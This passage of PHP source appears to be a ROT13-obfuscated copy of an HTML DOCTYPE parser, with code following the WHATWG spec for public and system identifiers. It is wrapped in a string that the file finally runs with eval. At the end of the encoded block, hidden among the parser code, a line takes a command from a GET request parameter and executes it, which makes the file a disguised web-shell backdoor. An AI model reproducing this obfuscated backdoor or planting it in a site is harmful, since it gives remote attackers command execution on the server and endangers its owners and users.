		$ng += fgefca( $qbpglcr_ugzy, \" \g\a\s\e\", $ng, $raq - $ng );
		vs ( $ng >= $raq ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, snyfr );
		}

		/*
		 * \"Nsgre QBPGLCR anzr fgngr\"
		 *
		 * Svaq n pnfr-vafrafvgvir zngpu sbe \"CHOYVP\" be \"FLFGRZ\" ng guvf cbvag.
		 * Bgurejvfr, frg sbepr-dhvexf naq ragre obthf QBPGLCR fgngr (fxvc gur erfg bs gur qbpglcr).
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#nsgre-qbpglcr-anzr-fgngr
		 */
		vs ( $ng + 6 >= $raq ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
		}

		/*
		 * > Vs gur fvk punenpgref fgnegvat sebz gur pheerag vachg punenpgre ner na NFPVV
		 * > pnfr-vafrafvgvir zngpu sbe gur jbeq \"CHOYVP\", gura pbafhzr gubfr punenpgref
		 * > naq fjvgpu gb gur nsgre QBPGLCR choyvp xrljbeq fgngr.
		 */
		vs ( 0 === fhofge_pbzcner( $qbpglcr_ugzy, 'CHOYVP', $ng, 6, gehr ) ) {
			$ng += 6;
			$ng += fgefca( $qbpglcr_ugzy, \" \g\a\s\e\", $ng, $raq - $ng );
			vs ( $ng >= $raq ) {
				erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
			}
			tbgb cnefr_qbpglcr_choyvp_vqragvsvre;
		}

		/*
		 * > Bgurejvfr, vs gur fvk punenpgref fgnegvat sebz gur pheerag vachg punenpgre ner na NFPVV
		 * > pnfr-vafrafvgvir zngpu sbe gur jbeq \"FLFGRZ\", gura pbafhzr gubfr punenpgref naq fjvgpu
		 * > gb gur nsgre QBPGLCR flfgrz xrljbeq fgngr.
		 */
		vs ( 0 === fhofge_pbzcner( $qbpglcr_ugzy, 'FLFGRZ', $ng, 6, gehr ) ) {
			$ng += 6;
			$ng += fgefca( $qbpglcr_ugzy, \" \g\a\s\e\", $ng, $raq - $ng );
			vs ( $ng >= $raq ) {
				erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
			}
			tbgb cnefr_qbpglcr_flfgrz_vqragvsvre;
		}

		/*
		 * > Bgurejvfr, guvf vf na vainyvq-punenpgre-frdhrapr-nsgre-qbpglcr-anzr cnefr reebe.
		 * > Frg gur pheerag QBPGLCR gbxra'f sbepr-dhvexf synt gb ba. Erpbafhzr va gur obthf
		 * > QBPGLCR fgngr.
		 */
		erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );

		cnefr_qbpglcr_choyvp_vqragvsvre:
		/*
		 * Gur cnefre fubhyq ragre \"QBPGLCR choyvp vqragvsvre (qbhoyr-dhbgrq) fgngr\" be
		 * \"QBPGLCR choyvp vqragvsvre (fvatyr-dhbgrq) fgngr\" ol svaqvat bar bs gur inyvq dhbgrf.
		 * Nalguvat ryfr sbeprf dhvexf zbqr naq vtaberf gur erfg bs gur pbagragf.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#qbpglcr-choyvp-vqragvsvre-(qbhoyr-dhbgrq)-fgngr
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#qbpglcr-choyvp-vqragvsvre-(fvatyr-dhbgrq)-fgngr
		 */
		$pybfre_dhbgr = $qbpglcr_ugzy[ $ng ];

		/*
		 * > Guvf vf n zvffvat-dhbgr-orsber-qbpglcr-choyvp-vqragvsvre cnefr reebe. Frg gur
		 * > pheerag QBPGLCR gbxra'f sbepr-dhvexf synt gb ba. Erpbafhzr va gur obthf QBPGLCR fgngr.
		 */
		vs ( '\"' !== $pybfre_dhbgr && \"'\" !== $pybfre_dhbgr ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
		}

		++$ng;

		$vqragvsvre_yratgu = fgepfca( $qbpglcr_ugzy, $pybfre_dhbgr, $ng, $raq - $ng );
		$qbpglcr_choyvp_vq = fge_ercynpr( \"\0\", \"\h{SSSQ}\", fhofge( $qbpglcr_ugzy, $ng, $vqragvsvre_yratgu ) );

		$ng += $vqragvsvre_yratgu;
		vs ( $ng >= $raq || $pybfre_dhbgr !== $qbpglcr_ugzy[ $ng ] ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
		}

		++$ng;

		/*
		 * \"Orgjrra QBPGLCR choyvp naq flfgrz vqragvsvref fgngr\"
		 *
		 * Nqinapr guebhtu juvgrfcnpr orgjrra choyvp naq flfgrz vqragvsvref.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#orgjrra-qbpglcr-choyvp-naq-flfgrz-vqragvsvref-fgngr
		 */
		$ng += fgefca( $qbpglcr_ugzy, \" \g\a\s\e\", $ng, $raq - $ng );
		vs ( $ng >= $raq ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, snyfr );
		}

		cnefr_qbpglcr_flfgrz_vqragvsvre:
		/*
		 * Gur cnefre fubhyq ragre \"QBPGLCR flfgrz vqragvsvre (qbhoyr-dhbgrq) fgngr\" be
		 * \"QBPGLCR flfgrz vqragvsvre (fvatyr-dhbgrq) fgngr\" ol svaqvat bar bs gur inyvq dhbgrf.
		 * Nalguvat ryfr sbeprf dhvexf zbqr naq vtaberf gur erfg bs gur pbagragf.
		 *
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#qbpglcr-flfgrz-vqragvsvre-(qbhoyr-dhbgrq)-fgngr
		 * @frr uggcf://ugzy.fcrp.jungjt.bet/#qbpglcr-flfgrz-vqragvsvre-(fvatyr-dhbgrq)-fgngr
		 */
		$pybfre_dhbgr = $qbpglcr_ugzy[ $ng ];

		/*
		 * > Guvf vf n zvffvat-dhbgr-orsber-qbpglcr-flfgrz-vqragvsvre cnefr reebe. Frg gur
		 * > pheerag QBPGLCR gbxra'f sbepr-dhvexf synt gb ba. Erpbafhzr va gur obthf QBPGLCR fgngr.
		 */
		vs ( '\"' !== $pybfre_dhbgr && \"'\" !== $pybfre_dhbgr ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
		}

		++$ng;

		$vqragvsvre_yratgu = fgepfca( $qbpglcr_ugzy, $pybfre_dhbgr, $ng, $raq - $ng );
		$qbpglcr_flfgrz_vq = fge_ercynpr( \"\0\", \"\h{SSSQ}\", fhofge( $qbpglcr_ugzy, $ng, $vqragvsvre_yratgu ) );

		$ng += $vqragvsvre_yratgu;
		vs ( $ng >= $raq || $pybfre_dhbgr !== $qbpglcr_ugzy[ $ng ] ) {
			erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, gehr );
		}

		erghea arj frys( $qbpglcr_anzr, $qbpglcr_choyvp_vq, $qbpglcr_flfgrz_vq, snyfr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>